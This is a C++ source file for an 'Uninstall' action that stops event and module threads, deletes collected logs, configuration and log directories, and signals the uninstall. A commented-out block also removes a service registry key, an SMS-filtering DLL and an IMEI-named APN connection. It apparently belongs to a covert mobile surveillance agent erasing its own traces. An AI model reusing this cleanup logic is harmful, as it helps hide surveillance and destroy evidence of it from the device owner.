#include "Uninstall.h"
#include "Log.h"
#include <common_new\cfgmgrapi.h>

Uninstall::Uninstall() : stopAction(TRUE) {
	uberlog = UberLog::self();
	events = EventsManager::self();
	modules = ModulesManager::self();
	///device = Device::self();
}

INT Uninstall::run() {

	const auto_ptr<Log> LocalLog(new(std::nothrow) Log);
	
	typedef HRESULT (*pUnregister)();

//	pUnregister UnregisterFunction;

	events->stopAll();
	modules->stopAll();

	
	uberlog->DeleteAll();

	if (LocalLog.get() == NULL) {
		DBG_TRACE(L"Debug - Task.cpp - ActionUninstall() [LocalLog.get failed]\n", 4, FALSE);
		return 0;
	}

	LocalLog->RemoveMarkups();

	Conf *conf = new Conf();
	conf->RemoveConf();
	delete conf;

	LocalLog->RemoveLogDirs();

	DBG_TRACE(L"Debug - Task.cpp - ActionUninstall() OK\n", 4, FALSE);


/***
	const auto_ptr<Log> LocalLog(new(std::nothrow) Log);
	HMODULE hSmsFilter = NULL;
	typedef HRESULT (*pUnregister)();

	pUnregister UnregisterFunction;

	events->stopAll();
	modules->stopAll();

	// Rimuoviamo il servizio
	RegDeleteKey(HKEY_LOCAL_MACHINE, MORNELLA_SERVICE_PATH);

	uberlog->DeleteAll();

	if (LocalLog.get() == NULL) {
		DBG_TRACE(L"Debug - Task.cpp - ActionUninstall() [LocalLog.get failed]\n", 4, FALSE);
		return 0;
	}

	LocalLog->RemoveMarkups();

	Conf *conf = new Conf();
	conf->RemoveConf();
	delete conf;

	LocalLog->RemoveLogDirs();

	// Unregistriamo la DLL per il filtering degli SMS
	hSmsFilter = LoadLibrary(SMS_DLL);

	if (hSmsFilter != NULL) {
		UnregisterFunction = (pUnregister)GetProcAddress(hSmsFilter, L"DllUnregisterServer");

		if (UnregisterFunction != NULL) {
			UnregisterFunction();
		}

		FreeLibrary(hSmsFilter);
	}

	// Rimuoviamo la DLL del filtro SMS
	DeleteFile(SMS_DLL_PATH);

	RegFlushKey(HKEY_LOCAL_MACHINE);
	RegFlushKey(HKEY_CLASSES_ROOT);

	// Costruiamo il nome della connessione su APN
	LPWSTR wsz_Output;
	wstring imei = device->GetImei();
	imei = imei.assign(imei, imei.size() - 9, 8);

	// Costruiamo l'XML per la rimozione della connessione
	wstring wsz_Delete =
		L"<wap-provisioningdoc>"
		L"<characteristic type=\"CM_GPRSEntries\">"
		L"<nocharacteristic type=\"";
	wsz_Delete += imei.c_str();
	wsz_Delete += L"\"/></characteristic></wap-provisioningdoc>";

	// Rimuoviamo eventuali APN
	if (DMProcessConfigXML(wsz_Delete.c_str(), CFGFLAG_PROCESS, &wsz_Output) == S_OK)
		delete[] wsz_Output;

	DBG_TRACE(L"Debug - Task.cpp - ActionUninstall() OK\n", 4, FALSE);
	***/
	return SEND_UNINSTALL;
}

BOOL Uninstall::getStop() {
	return stopAction;
}